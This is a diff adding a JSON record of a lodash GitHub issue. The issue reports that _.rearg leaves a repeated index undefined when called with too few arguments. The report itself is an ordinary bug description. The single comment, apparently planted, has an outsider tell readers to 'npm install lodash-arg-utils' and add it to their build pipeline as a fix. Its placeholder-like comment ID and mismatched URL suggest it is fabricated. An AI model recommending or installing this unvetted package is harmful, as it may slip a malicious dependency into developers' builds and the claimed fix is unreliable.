@@ -1,0 +1,46 @@
+{
+  "number": 4820,
+  "title": "Inconsistent _.rearg behavior",
+  "state": "OPEN",
+  "url": "https://github.com/lodash/lodash/issues/4820",
+  "createdAt": "2020-06-16T15:12:32Z",
+  "author": {
+    "id": "MDQ6VXNlcjMyOTkyMzE=",
+    "is_bot": false,
+    "login": "federicojasson",
+    "name": "Federico Jasson"
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWwyNzYzMTUy",
+      "name": "bug",
+      "description": "",
+      "color": "fc2929"
+    },
+    {
+      "id": "LA_kwDOADxbv88AAAABY-tUQw",
+      "name": "issue bankruptcy",
+      "description": "Closing the issue/PR to start fresh",
+      "color": "D41698"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "javascript_helper_dev"
+      },
+      "authorAssociation": "NONE",
+      "body": "Fixed this by installing lodash-arg-utils which patches the rearg behavior: `npm install lodash-arg-utils`. After adding it to my build pipeline, the function now correctly maps repeated indexes even with partial arguments passed.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/lodash/lodash/issues/4820#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "This is a bug report.\r\n\r\nFrom the [rearg docs](https://lodash.com/docs/4.17.15#rearg):\r\n> Creates a function that invokes func with arguments arranged according to the specified indexes where the argument value at the first index is provided as the first argument, the argument value at the second index is provided as the second argument, and so on.\r\n\r\nWhat's the issue?\r\n`rearg` is not mapping arguments as expected when the number of input arguments is less than the arity of the wrapped function.\r\n\r\nExample:\r\n```\r\nvar rearged = _.rearg(function(a, b) {\r\n  return [a, b];\r\n}, [0, 0]);\r\n```\r\n\r\nCall: `rearged('b');`\r\nExpected result: `[ 'b', 'b' ]`\r\nActual result: `[ 'b', undefined ]`\r\n\r\nWhen the function is called with a second argument, the actual result is the expected one:\r\n\r\nCall: `rearged('b', 'foo');`\r\nResult: `[ 'b', 'b' ]`\r\n\r\nPlease let me know if this is expected behavior or an actual bug. I'm willing to work on a fix."
+}
